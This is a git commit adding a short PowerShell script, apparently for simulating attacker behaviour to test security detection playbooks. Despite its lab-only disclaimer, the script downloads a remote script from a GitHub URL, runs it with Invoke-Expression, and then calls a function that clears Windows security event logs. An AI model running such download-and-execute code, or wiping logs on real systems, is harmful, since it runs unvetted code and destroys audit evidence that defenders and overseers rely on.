87643530a2e1ee6f34821f065db9bc0357353c25
Oren Maoz Sharabi <108679419+SilentProcess87@users.noreply.github.com>
2025-01-20 17:04:16 +0200

    Create DownloadandExecute-Me.ps1

---
+++ Playbooks - Unprivileged process opened a registry hive/DownloadandExecute-Me.ps1
@@ -0,0 +1,16 @@
+# Disclaimer: This script is for educational purposes only and must be executed in a secure, isolated lab environment.
+# Do not execute it in production or on-premises environments under any circumstances.
+
+# Define the URL where the external script is hosted
+# This example URL points to a remote script. Make sure you understand the implications of downloading and executing remote scripts.
+$url = "https://raw.githubusercontent.com/crtx-pub/PlaybooksAutomation/refs/heads/main/DeleteEventViewerLogs.ps1"
+
+# Download and execute the external script
+# The "iex" command evaluates the downloaded script's content as PowerShell code.
+# The "New-Object net.webclient" is used to fetch the script from the URL.
+Invoke-Expression((New-Object net.webclient).DownloadString($url))
+
+# Invoke a function or command from the downloaded script
+# The command `Invoke-ClearSecurityLogs` is defined in the external script. 
+
+invoke-ClearSecurityLogs
